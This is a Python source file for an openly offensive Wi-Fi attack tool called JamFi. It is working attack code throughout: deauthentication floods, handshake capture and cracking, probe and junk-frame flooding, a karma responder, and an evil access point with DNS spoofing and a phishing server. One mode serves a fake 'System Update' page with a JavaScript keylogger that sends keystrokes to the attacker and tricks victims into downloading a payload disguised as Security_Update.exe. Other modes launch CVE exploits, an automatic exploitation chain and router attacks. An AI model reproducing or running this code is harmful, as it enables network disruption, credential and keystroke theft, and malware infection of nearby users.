#!/usr/bin/env python3
import os
import sys
import time
import subprocess
import threading
import datetime
import shutil
import requests
from scapy.all import *
from threading import Thread
from random import choice, randint
from http.server import BaseHTTPRequestHandler, SimpleHTTPRequestHandler, HTTPServer

# Import new CVE modules
from detailed_scanner import DetailedScanner
from cve_matcher import match_cves
from exploit_launcher import launch_exploit
from router_exploits import router_attack_main

if not os.path.isdir("loot"):
    print(" Missing loot folder. Creating it now.")
    os.makedirs("loot", exist_ok=True)

# Global variables
interface = None
original_interface = None
ap_mac = None
stop_attack = False
scan_results = {}
seen_aps = {}
clients = {}

def require_root():
    if os.geteuid() != 0:
        print(" Jam_Fi must be run as root.")
        sys.exit(1)

def cleanup_services(iface=None):
    """Stop network services and flush iptables."""
    for cmd in [
        "pkill -f hostapd",
        "pkill -f dnsmasq",
        "pkill -f dnsspoof",
        "pkill -f phish_server.py",
        "iptables -t nat -F",
    ]:
        subprocess.run(cmd.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    if iface:
        subprocess.run(["ip", "link", "set", iface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "addr", "flush", "dev", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["ip", "link", "set", iface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def stop_monitor_mode():
    """Stop monitor mode and restart NetworkManager"""
    global interface, original_interface
    
    if interface and 'mon' in interface:
        print(f"[*] Stopping monitor mode on {interface}...")
        subprocess.run(["sudo", "airmon-ng", "stop", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        phys_iface = interface.replace('mon', '')
        print(f"[*] Restarting NetworkManager for {phys_iface}...")
        subprocess.run(["sudo", "systemctl", "start", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        if original_interface:
            subprocess.run(["sudo", "ip", "link", "set", original_interface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print("[+] Monitor mode stopped. Network restored to normal operation.")

def print_banner():
    print(r"""
     ██╗ █████╗ ███╗   ███╗        ███████╗██╗
     ██║██╔══██╗████╗ ████║        ██╔════╝██║
     ██║███████║██╔████╔██║        █████╗  ██║
██   ██║██╔══██║██║╚██╔╝██║        ██╔══╝  ██║
╚█████╔╝██║  ██║██║ ╚═╝ ██║███████╗██║     ██║
 ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝
         JamFi Wi-Fi Chaos Tool  
            by ekoms savior
""")

def get_interface():
    """Interactive interface selection"""
    global interface, original_interface
    
    print("\n[*] Detecting wireless interfaces...")
    
    result = subprocess.run(['iwconfig'], capture_output=True, text=True)
    interfaces = []
    for line in result.stdout.split('\n'):
        if 'IEEE 802.11' in line:
            iface = line.split()[0]
            interfaces.append(iface)
    
    if not interfaces:
        print("[!] No wireless interfaces found!")
        return False
    
    print("\n[+] Available wireless interfaces:")
    for i, iface in enumerate(interfaces):
        print(f"    [{i}] {iface}")
    
    choice = input("\nEnter interface name or number (default: wlan0): ").strip()
    
    if choice.isdigit() and int(choice) < len(interfaces):
        interface = interfaces[int(choice)]
    elif choice in interfaces:
        interface = choice
    elif choice == "":
        interface = "wlan0" if "wlan0" in interfaces else interfaces[0]
    else:
        interface = interfaces[0]
    
    original_interface = interface
    print(f"[+] Selected interface: {interface}")
    
    result = subprocess.run(['iwconfig', interface], capture_output=True, text=True)
    if 'Mode:Monitor' not in result.stdout:
        print(f"[!] {interface} is not in monitor mode")
        os.system('sudo airmon-ng check kill')
        os.system(f'sudo airmon-ng start {interface}')
        monitor_iface = f"{interface}mon"
        result = subprocess.run(['iwconfig', monitor_iface], capture_output=True, text=True)
        if 'Mode:Monitor' in result.stdout:
            interface = monitor_iface
            print(f"[+] Monitor mode enabled on {interface}")
    
    return True

def get_physical_interface():
    """Get physical interface name from monitor interface"""
    if interface.endswith('mon'):
        return interface[:-3]
    return interface

def channel_hopper():
    global interface
    while True:
        for ch in range(1, 14):
            subprocess.run(["iwconfig", interface, "channel", str(ch)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(0.3)

def packet_handler(pkt):
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr3
        ssid = pkt[Dot11Elt].info.decode(errors='ignore') or "<Hidden SSID>"
        if bssid not in seen_aps:
            seen_aps[bssid] = ssid
            scan_results[bssid] = {"ssid": ssid, "clients": []}
            print(f" AP: {ssid:<25} BSSID: {bssid}")
    if pkt.haslayer(Dot11) and pkt.type == 2:
        src = pkt.addr2
        bssid = pkt.addr3
        if bssid in seen_aps and src != bssid and src not in clients:
            clients[src] = bssid
            scan_results[bssid]["clients"].append(src)
            print(f" Client: {src} -> {seen_aps[bssid]}")

def scan_clients():
    global interface
    if not interface:
        if not get_interface():
            return
    print(" Scanning for clients and APs... (CTRL+C to stop)\n")
    Thread(target=channel_hopper, daemon=True).start()
    try:
        sniff(iface=interface, prn=packet_handler, store=0)
    except KeyboardInterrupt:
        print(" Scan stopped.")

def capture_handshake(bssid):
    global interface
    path = f"loot/handshake_{bssid.replace(':','')}.pcap"
    print(f" Capturing handshake to {bssid}, saving to {path}")

    def eapol(pkt):
        return pkt.haslayer(EAPOL) and (
            pkt.addr1 == bssid or pkt.addr2 == bssid or pkt.addr3 == bssid
        )

    try:
        pkts = sniff(iface=interface, lfilter=eapol, timeout=10)
        if pkts:
            wrpcap(path, pkts)
            print(f" Saved handshake to {path}")
        else:
            print(f" No handshake captured for {bssid}")
    except Exception as e:
        print(f" Error sniffing for {bssid}: {e}")

def deauth_attack():
    global interface
    if not interface:
        if not get_interface():
            return
    target = input(" Target Client MAC: ").strip()
    ap = input(" Access Point MAC: ").strip()
    count = int(input(" Number of packets: ") or 100)
    delay = float(input(" Delay between packets: ") or 0.05)
    capture = input(" Capture handshake? (y/n): ").strip().lower()
    if capture == "y":
        Thread(target=capture_handshake, args=(ap,)).start()
        time.sleep(2)
    frame = RadioTap()/Dot11(addr1=target, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
    sendp(frame, iface=interface, count=count, inter=delay)
    print(" Deauth complete!")

def deauth_all():
    global interface
    if not interface:
        if not get_interface():
            return
    if not scan_results:
        print(" Run scan first!")
        return
    count = int(input(" Number of packets per client (default 100): ") or 100)
    delay = float(input(" Delay between packets (default 0.05): ") or 0.05)
    print(" Deauthing all clients and sniffing handshakes...\n")

    for bssid, data in scan_results.items():
        print(f" Sniffing handshake for {bssid} ({seen_aps.get(bssid, 'Unknown')})...")
        capture_handshake(bssid)

        for client in data["clients"]:
            try:
                frame = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                sendp(frame, iface=interface, count=count, inter=delay, verbose=0)
                print(f" Deauthed {client} from {seen_aps.get(bssid, 'Unknown')}")
            except OSError as e:
                print(f" Error sending deauth to {client}: {e}")

def crack_handshakes():
    print(" Crack Captured Handshakes")
    loot_dir = "loot"
    pcaps = [f for f in os.listdir(loot_dir) if f.endswith(".pcap")]
    if not pcaps:
        print(" No .pcap handshake files found in loot/")
        return

    print("\n Available Handshakes:")
    for i, p in enumerate(pcaps):
        print(f"{i+1}. {p}")
    choice = input(" Choose a handshake file to crack: ").strip()
    if not choice.isdigit() or int(choice) < 1 or int(choice) > len(pcaps):
        print(" Invalid selection.")
        return
    pcap_file = os.path.join(loot_dir, pcaps[int(choice)-1])
    
    method = input(" Crack with (1) Aircrack-ng or (2) Hashcat? [1/2]: ").strip()
    wordlist = input(" Wordlist path (default: /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
    
    if method == "1":
        print(" Launching Aircrack-ng...")
        subprocess.run(["aircrack-ng", pcap_file, "-w", wordlist])
    elif method == "2":
        hccapx = pcap_file.replace(".pcap", ".hccapx")
        print(" Converting pcap to hccapx...")
        subprocess.run(["cap2hccapx", pcap_file, hccapx])
        print(" Launching Hashcat...")
        subprocess.run(["hashcat", "-m", "2500", hccapx, wordlist, "--force"])
    else:
        print(" Invalid choice.")

def probe_spammer():
    global interface
    if not interface:
        if not get_interface():
            return
    ssids = ["FreeWiFi", "Starbucks", "McDonald's", "Xfinity", "SchoolWiFi", "UnicornNet"]
    print(" Spamming probe requests...")
    while True:
        for ssid in ssids:
            pkt = RadioTap()/Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff",
                addr2=RandMAC(), addr3=RandMAC())/Dot11ProbeReq()/Dot11Elt(ID=0, info=ssid)
            sendp(pkt, iface=interface, verbose=0)
        time.sleep(0.2)

def junk_flood():
    global interface
    if not interface:
        if not get_interface():
            return
    print(" Sending junk packets...")
    while True:
        pkt = RadioTap()/Dot11(addr1=RandMAC(), addr2=RandMAC(), addr3=RandMAC())/Raw(load=os.urandom(50))
        sendp(pkt, iface=interface, verbose=0)

def karma_responder():
    global interface
    if not interface:
        if not get_interface():
            return
    print(" Karma responder: answering all probe requests...")
    def handle(pkt):
        if pkt.haslayer(Dot11ProbeReq) and pkt.haslayer(Dot11Elt):
            ssid = pkt[Dot11Elt].info.decode(errors='ignore') or "FreeWiFi"
            resp = RadioTap()/Dot11(type=0, subtype=8, addr1=pkt.addr2,
                addr2=RandMAC(), addr3=RandMAC())/Dot11Beacon(cap="ESS")/Dot11Elt(ID=0, info=ssid)
            sendp(resp, iface=interface, verbose=0)
            print(f" Responded to probe for: {ssid}")
    sniff(iface=interface, prn=handle)

def chaos_mode():
    global interface
    print(" Chaos Mode Engaged!")
    if not interface:
        if not get_interface():
            return
    Thread(target=probe_spammer, daemon=True).start()
    Thread(target=junk_flood, daemon=True).start()
    Thread(target=karma_responder, daemon=True).start()
    input("\nPress Enter to stop chaos mode...")
    print("[*] Stopping chaos mode...")

def evil_ap_mode():
    print("Starting Fully Connectable Evil AP Mode...")
    
    if not interface:
        if not get_interface():
            return
    
    phys_iface = get_physical_interface()
    print(f"[*] Using physical interface: {phys_iface}")
    ssid = input(" SSID to broadcast (e.g. Free_Public_WiFi): ").strip()

    os.makedirs("loot", exist_ok=True)

    print("Cleaning up old services...")
    cleanup_services(phys_iface)

    print(" Configuring network interface...")
    subprocess.run(["sudo", "airmon-ng", "stop", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "ip", "link", "set", phys_iface, "down"])
    subprocess.run(["sudo", "ip", "addr", "flush", "dev", phys_iface])
    subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", phys_iface])
    subprocess.run(["sudo", "ip", "link", "set", phys_iface, "up"])

    hostapd_conf = f"""
interface={phys_iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
    """.strip()

    with open("loot/hostapd.conf", "w") as f:
        f.write(hostapd_conf)

    dnsmasq_conf = f"""
interface={phys_iface}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
    """.strip()

    with open("loot/dnsmasq.conf", "w") as f:
        f.write(dnsmasq_conf)

    print(f"Starting Evil AP on {phys_iface} with SSID: {ssid}")
    subprocess.Popen(["sudo", "hostapd", "loot/hostapd.conf"])
    time.sleep(2)

    print("Launching dnsmasq...")
    subprocess.Popen(["sudo", "dnsmasq", "-C", "loot/dnsmasq.conf"])

    print("Hosting phishing login at http://10.0.0.1 ...")
    subprocess.Popen(["sudo", "python3", "phish_server.py"])

    print("Enabling HTTP redirection with iptables...")
    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"])
    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"])
    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"])

    subprocess.run(["sudo", "pkill", "-f", "dnsmasq"])
    subprocess.run(["sudo", "pkill", "-f", "jamfi_dns_spoofer.py"])
    time.sleep(1) 

    print("Launching JamFi DNS spoofer...")
    subprocess.Popen(["python3", "jamfi_dns_spoofer.py"])

    print("Press CTRL+C to stop Evil AP.")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(" Evil AP stopped.")
    finally:
        cleanup_services(phys_iface)
        os.system(f"sudo airmon-ng start {phys_iface}")
        print(f"[+] Restarted monitor mode on {phys_iface}")

def mitm_hid_injection():
    global interface
    print("Starting MITM HID Injection Mode...")
    
    if not interface:
        if not get_interface():
            return
    
    phys_iface = get_physical_interface()
    print(f"[*] Using physical interface: {phys_iface}")
    ssid = input("SSID clients think they're connecting to: ").strip()
    fake = input("Fake SSID to broadcast: ").strip()

    use_ngrok = input("Use Ngrok for remote access? (y/n): ").strip().lower() == "y"

    os.makedirs("loot", exist_ok=True)
    os.makedirs("payloads", exist_ok=True)

    print("\n Available Payloads in /payloads:")
    payload_files = [f for f in os.listdir("payloads") if os.path.isfile(os.path.join("payloads", f)) and f != "payloads_README.md"]
    for i, f in enumerate(payload_files):
        print(f"{i+1}) {f}")
    print("0) None (use keylogger only)")
    choice = input(" Choose payload to serve: ").strip()
    selected_payload = None
    if choice.isdigit() and int(choice) in range(1, len(payload_files)+1):
        selected_payload = payload_files[int(choice)-1]
        shutil.copyfile(f"payloads/{selected_payload}", f"loot/{selected_payload}")
        print(f"[+] Selected payload: {selected_payload}")

    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M")
    session_log = f"session_log_{timestamp}.txt"
    keystroke_log = f"keystroke_log_{timestamp}.txt"
    
    cleanup_services(phys_iface)
    subprocess.run(["sudo", "airmon-ng", "stop", interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "ip", "link", "set", phys_iface, "down"])
    subprocess.run(["sudo", "ip", "addr", "flush", "dev", phys_iface])
    subprocess.run(["sudo", "ip", "addr", "add", "10.0.0.1/24", "dev", phys_iface])
    subprocess.run(["sudo", "ip", "link", "set", phys_iface, "up"])

    with open("loot/hostapd.conf", "w") as f:
        f.write(f"""
interface={phys_iface}
driver=nl80211
ssid={fake}
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
""".strip())

    with open("loot/dnsmasq.conf", "w") as f:
        f.write(f"""
interface={phys_iface}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
""".strip())

    public_url = "http://10.0.0.1"
    if use_ngrok:
        print(" Launching Ngrok tunnel on port 80...")
        subprocess.Popen(["ngrok", "http", "80"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)
        try:
            res = requests.get("http://localhost:4040/api/tunnels")
            tunnels = res.json().get("tunnels", [])
            if tunnels:
                public_url = tunnels[0].get("public_url", "http://10.0.0.1")
                print(f" Ngrok Public URL: {public_url}")
            else:
                raise Exception("No Ngrok tunnels found.")
        except Exception as e:
            print(f" Failed to get Ngrok URL: {e}")
            print(" Falling back to local IP: http://10.0.0.1")

    with open("loot/injection.html", "w") as f:
        f.write(f"""<!DOCTYPE html>
<html>
<head><title>System Update Required</title>
<script>
var keys = '';
var keylogInterval = setInterval(function() {{
    if(keys.length > 0) {{
        fetch('/log_key', {{
            method: 'POST',
            body: keys,
            headers: {{'Content-Type': 'text/plain'}}
        }});
        keys = '';
    }}
}}, 2000);

document.onkeypress = function(e) {{
    e = e || window.event;
    var key = e.key || String.fromCharCode(e.keyCode);
    keys += key;
}};

document.onkeydown = function(e) {{
    e = e || window.event;
    var specialKeys = {{
        8: '[BACKSPACE]',
        9: '[TAB]',
        13: '[ENTER]\\n',
        16: '[SHIFT]',
        17: '[CTRL]',
        18: '[ALT]',
        20: '[CAPS]',
        27: '[ESC]',
        32: ' ',
        37: '[LEFT]',
        38: '[UP]',
        39: '[RIGHT]',
        40: '[DOWN]',
        46: '[DELETE]',
        36: '[HOME]',
        35: '[END]',
        33: '[PGUP]',
        34: '[PGDN]'
    }};
    if(specialKeys[e.keyCode]) {{
        keys += specialKeys[e.keyCode];
    }}
}};

setTimeout(function() {{
    window.location.href = '{public_url}/fake_update.html';
}}, 5000);
</script>
</head>
<body style="text-align:center; padding:50px; font-family:Arial;">
<h2>Critical System Update Required</h2>
<p>Your system needs an immediate security update.</p>
<p>Please wait while we prepare the update...</p>
<div style="margin-top:30px;">
    <input type="text" id="fakeinput" placeholder="Loading..." autofocus style="padding:10px; width:300px;">
</div>
</body>
</html>""")

    with open("loot/fake_update.html", "w") as f:
        if selected_payload:
            f.write(f"""<!DOCTYPE html>
<html>
<head><title>Update Ready</title></head>
<body style="text-align:center; padding:50px; font-family:Arial;">
<h2>Security Update Ready</h2>
<p>Click below to install the latest security patch.</p>
<button onclick="downloadPayload()" style="padding:10px 20px; font-size:16px; background:#4CAF50; color:white; border:none; cursor:pointer;">Install Update</button>
<script>
function downloadPayload() {{
    var link = document.createElement('a');
    link.href = '{public_url}/{selected_payload}';
    link.download = 'Security_Update.exe';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    document.body.innerHTML = '<h2>Update installed successfully!</h2><p>Your system is now secure.</p><p>Redirecting...</p>';
    setTimeout(function() {{
        window.location.href = 'https://www.google.com';
    }}, 3000);
}}
</script>
</body>
</html>""")
        else:
            f.write("""<!DOCTYPE html>
<html>
<head><title>Update Ready</title></head>
<body style="text-align:center; padding:50px; font-family:Arial;">
<h2>System Update Complete</h2>
<p>Your system has been updated successfully.</p>
<script>
setTimeout(function() {
    window.location.href = 'https://www.google.com';
}, 3000);
</script>
</body>
</html>""")

    with open("loot/dnsspoof_hosts", "w") as f:
        f.write("10.0.0.1 *\n")

    os.chdir("loot")
    open(session_log, "a").close()
    open(keystroke_log, "a").close()

    print(f"Broadcasting SSID: {fake}")
    subprocess.Popen(["sudo", "hostapd", "hostapd.conf"])
    time.sleep(2)
    subprocess.Popen(["sudo", "dnsmasq", "-C", "dnsmasq.conf"])
    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"])
    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"])
    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"])

    subprocess.run(["sudo", "pkill", "-f", "dnsmasq"])
    subprocess.run(["sudo", "pkill", "-f", "jamfi_dns_spoofer.py"])
    time.sleep(1)  

    print("Starting Python DNS spoofer...")
    subprocess.Popen(["python3", "../jamfi_dns_spoofer.py"])

    class HIDHandler(BaseHTTPRequestHandler):
        def do_POST(self):
            if self.path == "/log_key":
                content_length = int(self.headers.get('Content-Length', 0))
                post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
                ip = self.client_address[0]
                with open(keystroke_log, "a") as f:
                    f.write(f"[{datetime.now()}] {ip} keys: {post_data}\n")
                self.send_response(204)
                self.end_headers()
            else:
                self.send_error(404)

        def do_GET(self):
            ua = self.headers.get("User-Agent", "unknown")
            ip = self.client_address[0]
            with open(session_log, "a") as f:
                f.write(f"[{datetime.now()}] IP: {ip} | UA: {ua} | Path: {self.path}\n")

            if self.path == "/" or self.path == "/index.html":
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                with open("injection.html", "rb") as f:
                    self.wfile.write(f.read())
            elif self.path == "/fake_update.html":
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                with open("fake_update.html", "rb") as f:
                    self.wfile.write(f.read())
            elif selected_payload and self.path == f"/{selected_payload}":
                self.send_response(200)
                self.send_header('Content-Disposition', f'attachment; filename="{selected_payload}"')
                self.send_header('Content-type', 'application/octet-stream')
                self.end_headers()
                with open(selected_payload, "rb") as f:
                    self.wfile.write(f.read())
            elif self.path == "/track":
                self.send_response(200)
                self.send_header("Content-type", "image/gif")
                self.end_headers()
                self.wfile.write(b"GIF89a")
            else:
                self.send_error(404)

        def log_message(self, format, *args):
            return

    print(" Serving fake pages on http://10.0.0.1 ...")
    print(f"[+] Keystrokes being logged to loot/{keystroke_log}")
    print(f"[+] Session log: loot/{session_log}")
    if selected_payload:
        print(f"[+] Payload available: {selected_payload}")
    print("[+] Victims will be redirected to fake update page after 5 seconds")
    try:
        HTTPServer(("0.0.0.0", 80), HIDHandler).serve_forever()
    except KeyboardInterrupt:
        print("Server stopped.")
    finally:
        cleanup_services(phys_iface)
        os.chdir("..")
        os.system(f"sudo airmon-ng start {phys_iface}")
        print(f"[+] Restarted monitor mode on {phys_iface}")

def loot_viewer():
    print("\n[+] Loot Directory Contents:")
    os.system("ls -lah loot/")
    print("\n[+] Credentials Log:")
    if os.path.exists("loot/creds.txt"):
        os.system("cat loot/creds.txt")
    else:
        print("No credentials captured yet.")
    print("\n[+] Handshake Files:")
    os.system("ls -lah loot/*.pcap 2>/dev/null || echo 'No handshake files found'")
    print("\n[+] Keystroke Logs:")
    os.system("ls -lah loot/keystroke_log_*.txt 2>/dev/null || echo 'No keystroke logs found'")
    print("\n[+] Session Logs:")
    os.system("ls -lah loot/session_log_*.txt 2>/dev/null || echo 'No session logs found'")

def vulnerability_scan_and_exploit():
    global ap_mac, interface
    
    if not interface:
        if not get_interface():
            return
    
    print("\n[!] CVE Vulnerability Scanner & Exploit Launcher")
    print("[!] This module fingerprints clients and checks for known CVEs")
    
    ap_mac = input("Enter target AP MAC address (or press Enter to scan): ").strip()
    if not ap_mac:
        print("[*] Scanning for APs...")
        os.system(f"sudo timeout 30 airodump-ng {interface}")
        ap_mac = input("Enter target AP MAC: ").strip()
        if not ap_mac:
            print("[!] No AP selected. Returning to menu.")
            return
    
    print("[*] Performing detailed client fingerprinting...")
    scanner = DetailedScanner(interface)
    clients_list = scanner.scan(duration=45)
    
    if not clients_list:
        print("[!] No clients found. Make sure targets are nearby.")
        return
    
    vulnerable_clients = []
    
    for client in clients_list:
        print(f"\n[*] Analyzing {client['mac']}...")
        cves = match_cves(client)
        
        if cves:
            print(f"[!] VULNERABLE: {client['mac']}")
            for cve in cves:
                print(f"    - {cve['cve_id']} (CVSS: {cve['cvss_score']})")
                print(f"      Exploit available: {cve['exploit_available']}")
            vulnerable_clients.append({'client': client, 'cves': cves})
        else:
            print(f"[+] {client['mac']} - No known CVEs found")
    
    if not vulnerable_clients:
        print("\n[+] No vulnerable clients found.")
        return
    
    print("\n[!] Vulnerable clients:")
    for i, vuln in enumerate(vulnerable_clients):
        print(f"[{i}] {vuln['client']['mac']} - {len(vuln['cves'])} CVEs found")
    
    choice = input("\nSelect client to exploit (number): ").strip()
    try:
        idx = int(choice)
        target = vulnerable_clients[idx]
    except:
        print("[!] Invalid selection")
        return
    
    print("\nAvailable exploits:")
    for i, cve in enumerate(target['cves']):
        print(f"[{i}] {cve['cve_id']} (CVSS: {cve['cvss_score']})")
    
    cve_choice = input("Select exploit (number): ").strip()
    try:
        cve_idx = int(cve_choice)
        selected_cve = target['cves'][cve_idx]
        
        print(f"\n[*] Launching {selected_cve['cve_id']} against {target['client']['mac']}")
        result = launch_exploit(selected_cve['cve_id'], target['client'], interface, ap_mac)
        
        if result:
            print("[+] Exploit completed successfully!")
        else:
            print("[-] Exploit may have failed. Check loot folder for details.")
    except Exception as e:
        print(f"[!] Error launching exploit: {e}")

def auto_pwn_mode():
    global ap_mac, interface
    
    if not interface:
        if not get_interface():
            return
    
    print("\n[!] AUTO-PWN MODE - FULL INTRUSIVE CHAIN")
    print("[!] This will automatically fingerprint and exploit all vulnerable clients")
    
    ap_mac = input("Enter target AP MAC: ").strip()
    if not ap_mac:
        print("[!] AP MAC required for auto-pwn")
        return
    
    print("[*] Scanning for vulnerable clients...")
    scanner = DetailedScanner(interface)
    clients_list = scanner.scan(duration=45)
    
    if not clients_list:
        print("[!] No clients found")
        return
    
    successful = 0
    for client in clients_list:
        print(f"\n[*] Processing {client['mac']}...")
        cves = match_cves(client)
        
        if cves:
            print(f"[!] Client vulnerable! Attempting exploitation...")
            for cve in cves:
                if cve['exploit_available'] == 'yes':
                    print(f"    Trying {cve['cve_id']}...")
                    if launch_exploit(cve['cve_id'], client, interface, ap_mac):
                        successful += 1
                    time.sleep(5)
        else:
            print(f"    Not vulnerable, skipping")
    
    print(f"\n[+] Auto-pwn completed. Successfully exploited {successful} clients.")

def main_menu():
    iface_display = interface if interface else "Not Set"
    print(f"\n Interface: {iface_display}")
    print(" 1  Scan Clients & APs ")
    print(" 2  Deauth One Client ")
    print(" 3  Deauth ALL Clients + Capture Handshakes ")
    print(" 4  Crack Captured Handshakes ")
    print(" 5  Probe Request Spam ")
    print(" 6  Junk Packet Flood ")
    print(" 7  Karma Responder ")
    print(" 8  Chaos Mode (All attacks combined) ")
    print(" 9  View Loot (Credentials, Handshakes) ")
    print(" 10 Evil AP (Rogue Access Point) ")
    print(" 11 MITM HID Injection (Payload Delivery System) ")
    print(" 12 CVE Vulnerability Scanner & Exploit (NEW) ")
    print(" 13 Auto-Pwn Mode - Full Intrusive Chain (NEW) ")
    print(" 14 Router Exploits (Huawei, MikroTik, TP-Link, Netgear, D-Link, Zyxel) ")
    print(" 0  Quit ")

def main():
    global interface
    require_root()
    
    os.makedirs("loot", exist_ok=True)
    os.makedirs("payloads", exist_ok=True)
    
    if not get_interface():
        print("[!] Failed to setup interface. Exiting.")
        sys.exit(1)
    
    print_banner()
    try:
        while True:
            main_menu()
            choice = input(" Choose an option: ").strip()

            if choice == "1": scan_clients()
            elif choice == "2": deauth_attack()
            elif choice == "3": deauth_all()
            elif choice == "4": crack_handshakes()
            elif choice == "5": 
                try: probe_spammer()
                except KeyboardInterrupt: print("\n Stopped probe spam")
            elif choice == "6": 
                try: junk_flood()
                except KeyboardInterrupt: print("\n Stopped junk flood")
            elif choice == "7": 
                try: karma_responder()
                except KeyboardInterrupt: print("\n Stopped karma responder")
            elif choice == "8": chaos_mode()
            elif choice == "9": loot_viewer()
            elif choice == "10": evil_ap_mode()
            elif choice == "11": mitm_hid_injection()
            elif choice == "12": 
                vulnerability_scan_and_exploit()
                input("\nPress Enter to continue...")
            elif choice == "13": 
                auto_pwn_mode()
                input("\nPress Enter to continue...")
            elif choice == "14":
                router_attack_main(interface)
                input("\nPress Enter to continue...")
            elif choice == "0":
                print("Goodbye fren!")
                break
            else:
                print(" Invalid choice!")
    finally:
        stop_monitor_mode()
        cleanup_services()
        sys.exit(0)

if __name__ == "__main__":
    main()
